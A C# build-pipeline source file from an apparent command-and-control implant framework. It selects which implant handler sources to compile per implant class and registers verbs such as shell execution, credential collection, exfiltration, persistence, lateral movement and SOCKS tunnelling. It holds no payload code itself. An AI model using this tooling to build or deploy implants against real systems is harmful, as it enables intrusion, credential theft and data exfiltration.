using System.Text;
using Rod.CoreState.Implants;

namespace Rod.BuildPipeline.PayloadBuild;

/// <summary>
/// The handler modules a build compiles in (architecture.md Sec 5.2, Sec 5.3):
/// the reference verbs whose registrations the generated
/// <c>HandlerSelection</c> carries, and the handler source files that leave
/// the staging copy's compilation whole.
/// </summary>
public sealed record HandlerModules(
    IReadOnlyList<string> RegisteredVerbs,
    IReadOnlyList<string> DroppedSourceFiles);

/// <summary>
/// The bake-time handler trim (architecture.md Sec 5.2, Sec 5.3): selects
/// which handler sources an implant-class build compiles and rewrites the
/// staging copy accordingly. The class's verb set -- the server's authority
/// for what the artifact may run -- decides the set: a handler source stays
/// when the class keeps any of its verbs (or another kept source needs it),
/// the rest leave the compilation whole, and a generated selection replaces
/// the checked-in <c>HandlerSelection</c> stub registering only the kept
/// verbs. A reduced class is therefore a genuinely reduced binary -- the code
/// for capabilities the artifact will never run neither links nor ships.
/// </summary>
/// <remarks>
/// <para>
/// The trim is whole source files, the same shape the transport trim uses:
/// a file holding one kept verb keeps all its handlers (a class keeping
/// shell.exec keeps the recon verbs' file; the recon verbs themselves still
/// do not register), and a support file a kept handler needs stays with it
/// (collect.screenshot keeps the capture and PNG sources). The shared
/// infrastructure every dispatch path touches -- the registry machinery, the
/// channel contract, the enroll bundle, the chunker -- is always compiled
/// and never appears in the file map.
/// </para>
/// <para>
/// Out-of-tree handlers follow the same rule through the extension overlay:
/// a handler whose verb the class table gates compiles only into builds
/// whose class carries the verb, while the ungated contract verbs and any
/// verb the class table does not know ride every build
/// (<see cref="VerbCompiles"/>). The stager tree is never trimmed: a stage-1
/// loader carries no tradecraft handlers.
/// </para>
/// </remarks>
public static class HandlerModuleSelection
{
    // One reference handler source: its verbs, and the other handler sources
    // it needs when it stays. Paths are relative to the implant tree root,
    // the same convention TransportModuleSelection uses.
    private sealed record HandlerFile(string Path, string[] Verbs, string[] DependsOn);

    // The reference implant's handler sources and the verbs they serve,
    // mirrored from the implant's own layout -- kept in lockstep with
    // src/implant/dotnet/Internal the same way the transport selection
    // mirrors the URL rule. Files absent here are always compiled.
    private static readonly HandlerFile[] HandlerFiles =
    {
        new("Internal/Exec.cs",
            new[] { "shell.exec", "recon.portscan", "recon.hostenum", "recon.service" },
            Array.Empty<string>()),
        new("Internal/Files.cs",
            new[] { "file.push", "file.pull" },
            Array.Empty<string>()),
        new("Internal/Proc.cs",
            new[] { "proc.kill", "recon.ps" },
            Array.Empty<string>()),
        new("Internal/Lateral.cs",
            new[] { "lateral.move", "lateral.token", "lateral.exec_remote" },
            Array.Empty<string>()),
        new("Internal/Persist.cs",
            new[] { "persist.install", "persist.remove", "persist.list" },
            Array.Empty<string>()),
        new("Internal/Collect.cs",
            new[] { "collect.cred", "collect.screenshot" },
            new[] { "Internal/ScreenCapture.cs", "Internal/Png.cs" }),
        new("Internal/Exfil.cs",
            new[] { "exfil.push", "exfil.stage" },
            Array.Empty<string>()),
        new("Internal/InteractiveShell.cs",
            new[] { "shell.interact" },
            new[] { "Internal/Exec.cs" }),
        new("Internal/TunnelForward.cs",
            new[] { "tunnel.forward" },
            Array.Empty<string>()),
        new("Internal/TunnelSocks.cs",
            new[] { "tunnel.socks" },
            Array.Empty<string>()),
        new("Internal/ScreenCapture.cs",
            Array.Empty<string>(),
            Array.Empty<string>()),
        new("Internal/Png.cs",
            Array.Empty<string>(),
            Array.Empty<string>()),
    };

    // The one-shot registrations, in the stub's registration order. The
    // fragment is the exact code the generated selection emits inside the
    // Handlers collection -- the same lines the checked-in HandlerSelection
    // stub carries, so a full-set generation and the dev tree register the
    // same handlers in the same order.
    private static readonly (string Verb, string Fragment)[] OneShotFragments =
    {
        ("shell.exec", "new CapabilityHandler(\"shell.exec\", args => Core.ShellExec(args)),"),
        ("shell.interact", "new CapabilityHandler(\"shell.interact\", _ =>\n"
            + "            (TaskOutcome.Failed, \"shell.interact runs as a live channel; this dispatch path does not carry one\")),"),
        ("tunnel.forward", "new CapabilityHandler(\"tunnel.forward\", _ =>\n"
            + "            (TaskOutcome.Failed, \"tunnel.forward runs as a live channel; this dispatch path does not carry one\")),"),
        ("tunnel.socks", "new CapabilityHandler(\"tunnel.socks\", _ =>\n"
            + "            (TaskOutcome.Failed, \"tunnel.socks runs as a live channel; this dispatch path does not carry one\")),"),
        ("file.push", "new CapabilityHandler(\"file.push\", args => Files.Push(args)),"),
        ("file.pull", "new CapabilityHandler(\"file.pull\", args => Files.Pull(args)),"),
        ("proc.kill", "new CapabilityHandler(\"proc.kill\", args => Proc.Kill(args)),"),
        ("recon.portscan", "new CapabilityHandler(\"recon.portscan\", args => Core.PortScan(args)),"),
        ("recon.hostenum", "new CapabilityHandler(\"recon.hostenum\", args => Core.HostEnum(args)),"),
        ("recon.service", "new CapabilityHandler(\"recon.service\", args => Core.ServiceProbe(args)),"),
        ("recon.ps", "new CapabilityHandler(\"recon.ps\", args => Proc.List(args)),"),
        ("lateral.move", "new CapabilityHandler(\"lateral.move\", args => Lateral.Move(args, enroll)),"),
        ("lateral.token", "new CapabilityHandler(\"lateral.token\", args => Lateral.Token(args)),"),
        ("lateral.exec_remote", "new CapabilityHandler(\"lateral.exec_remote\", args => Lateral.ExecRemote(args)),"),
        ("persist.install", "new CapabilityHandler(\"persist.install\", args => Persist.Install(args)),"),
        ("persist.remove", "new CapabilityHandler(\"persist.remove\", args => Persist.Remove(args)),"),
        ("persist.list", "new CapabilityHandler(\"persist.list\", args => Persist.List(args)),"),
        ("collect.cred", "new CapabilityHandler(\"collect.cred\", args => Collect.Cred(args)),"),
        ("collect.screenshot", "new CapabilityHandler(\"collect.screenshot\", args => Collect.Screenshot(args)),"),
        ("exfil.push", "new CapabilityHandler(\"exfil.push\", args => Exfil.Push(args)),"),
        ("exfil.stage", "new CapabilityHandler(\"exfil.stage\", args => Exfil.Stage(args)),"),
    };

    // The staged registrations (architecture.md Sec 10, the typed arm), the
    // same sparse set the stub carries.
    private static readonly (string Verb, string Fragment)[] StagedFragments =
    {
        ("file.push", "(\"file.push\", (args, data) => Files.PushStaged(args, data)),"),
    };

    // The channel registrations (architecture.md Sec 10.3), same order as the
    // stub.
    private static readonly (string Verb, string Fragment)[] ChannelFragments =
    {
        ("shell.interact", "new(\"shell.interact\", (args, stream, ct) => InteractiveShell.RunAsync(args, stream, ct)),"),
        ("tunnel.forward", "new(\"tunnel.forward\", (args, stream, ct) => TunnelForward.RunAsync(args, stream, ct)),"),
        ("tunnel.socks", "new(\"tunnel.socks\", (args, stream, ct) => TunnelSocks.RunAsync(args, stream, ct)),"),
    };

    // The generated selection replaces this checked-in stub, relative to the
    // implant tree root. The stub registers the full reference set so the dev
    // tree runs every verb.
    public const string SelectionFile = "Internal/HandlerSelection.cs";

    /// <summary>
    /// Selects the handler modules a class's build compiles: the verbs whose
    /// registrations the generated selection carries (the class set
    /// intersected with the reference registrations, in registration order),
    /// and the handler sources that leave the compilation whole (those none
    /// of the kept verbs need). A class keeping every reference verb -- the
    /// stage-2 class -- drops nothing.
    /// </summary>
    public static HandlerModules Select(ImplantClass @class)
    {
        var permitted = new HashSet<string>(ImplantClassCapabilities.For(@class), StringComparer.OrdinalIgnoreCase);

        // The reverse support edges: which kept sources still need a file.
        // A handler source stays when the class keeps one of its verbs, or
        // another kept source depends on it -- the fixed point of the
        // dependency edges, so a kept handler never loses its support code.
        var dependents = new Dictionary<string, List<string>>(StringComparer.Ordinal);
        foreach (var file in HandlerFiles)
        {
            foreach (var dep in file.DependsOn)
            {
                if (!dependents.TryGetValue(dep, out var neededBy))
                {
                    neededBy = new List<string>();
                    dependents[dep] = neededBy;
                }
                neededBy.Add(file.Path);
            }
        }

        var kept = new HashSet<string>(StringComparer.Ordinal);
        bool changed;
        do
        {
            changed = false;
            foreach (var file in HandlerFiles)
            {
                if (kept.Contains(file.Path))
                    continue;
                var stays = file.Verbs.Any(permitted.Contains)
                    || (dependents.TryGetValue(file.Path, out var neededBy)
                        && neededBy.Any(kept.Contains));
                if (stays)
                {
                    kept.Add(file.Path);
                    changed = true;
                }
            }
        }
        while (changed);

        var dropped = HandlerFiles
            .Select(f => f.Path)
            .Where(path => !kept.Contains(path))
            .OrderBy(path => path, StringComparer.Ordinal)
            .ToList();
        var registered = OneShotFragments
            .Select(f => f.Verb)
            .Where(permitted.Contains)
            .ToList();
        return new HandlerModules(registered, dropped);
    }

    /// <summary>
    /// Whether a build of <paramref name="class"/> compiles a handler serving
    /// <paramref name="verb"/>: true when the class set carries the verb, and
    /// also when the class table does not gate the verb at all -- the
    /// ungated contract verbs (evasion, exploit) and any verb no class lists
    /// ride every build, so an out-of-tree handler for one still compiles
    /// wherever the extension kit is configured. Only a verb some class gates
    /// and this class withholds stays out.
    /// </summary>
    public static bool CompilesVerb(ImplantClass @class, string? verb)
    {
        if (verb is null)
            return true;
        if (!GatedVerbs.Contains(verb))
            return true;
        return ImplantClassCapabilities.Allows(@class, verb);
    }

    /// <summary>
    /// Rewrites the staging copy of the implant tree to carry exactly the
    /// selected handlers: the dropped sources are deleted whole, and the
    /// generated <c>HandlerSelection</c> replaces the checked-in stub
    /// registering only the selected verbs.
    /// </summary>
    public static void Apply(string stagingDir, HandlerModules selection)
    {
        ArgumentNullException.ThrowIfNull(stagingDir);
        ArgumentNullException.ThrowIfNull(selection);
        foreach (var file in selection.DroppedSourceFiles)
            File.Delete(Path.Combine(stagingDir, file));
        File.WriteAllText(Path.Combine(stagingDir, SelectionFile), RenderSelection(selection));
    }

    // Every verb any class's reduced set lists: the gated vocabulary. A verb
    // outside it is ungated (the contract-only evasion/exploit set) or the
    // operator's own, and gates no build.
    private static readonly HashSet<string> GatedVerbs = BuildGatedVerbs();

    private static HashSet<string> BuildGatedVerbs()
    {
        var verbs = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        foreach (ImplantClass @class in Enum.GetValues<ImplantClass>())
        {
            foreach (var verb in ImplantClassCapabilities.For(@class))
                verbs.Add(verb);
        }
        return verbs;
    }

    // Renders the per-build HandlerSelection: same shape as the checked-in
    // stub, registering only the verbs the class keeps.
    private static string RenderSelection(HandlerModules selection)
    {
        var permitted = new HashSet<string>(selection.RegisteredVerbs, StringComparer.OrdinalIgnoreCase);
        var sb = new StringBuilder();
        sb.Append("// <auto-generated> Generated by Rod.DotNetBuildUnit at build time.\n")
          .Append("// The reference handlers this artifact compiles (architecture.md Sec 5.3),\n")
          .Append("// selected from the build class's verb set.\n")
          .Append("#nullable enable\n")
          .Append("using Rod.V1;\n\n")
          .Append("namespace Rod.Implant.Internal;\n\n")
          .Append("internal static class HandlerSelection\n")
          .Append("{\n")
          .Append("    public static IReadOnlyList<ICapabilityHandler> Handlers(EnrollBundle? enroll) =>\n")
          .Append("    [\n");
        AppendFragments(sb, OneShotFragments, permitted);
        sb.Append("    ];\n\n")
          .Append("    public static IReadOnlyList<(string Verb, Func<string, byte[], (TaskOutcome Outcome, string Output)> Handle)> Staged =>\n")
          .Append("    [\n");
        AppendFragments(sb, StagedFragments, permitted);
        sb.Append("    ];\n\n")
          .Append("    public static IReadOnlyList<CapabilityChannelHandler> Channels =>\n")
          .Append("    [\n");
        AppendFragments(sb, ChannelFragments, permitted);
        sb.Append("    ];\n")
          .Append("}\n");
        return sb.ToString();
    }

    // Emits the fragments whose verb the class keeps, at the stub's list
    // indentation; a fragment's own newlines carry its continuation indent.
    private static void AppendFragments(
        StringBuilder sb,
        (string Verb, string Fragment)[] fragments,
        HashSet<string> permitted)
    {
        foreach (var (verb, fragment) in fragments)
        {
            if (!permitted.Contains(verb))
                continue;
            sb.Append("        ").Append(fragment).Append('\n');
        }
    }
}
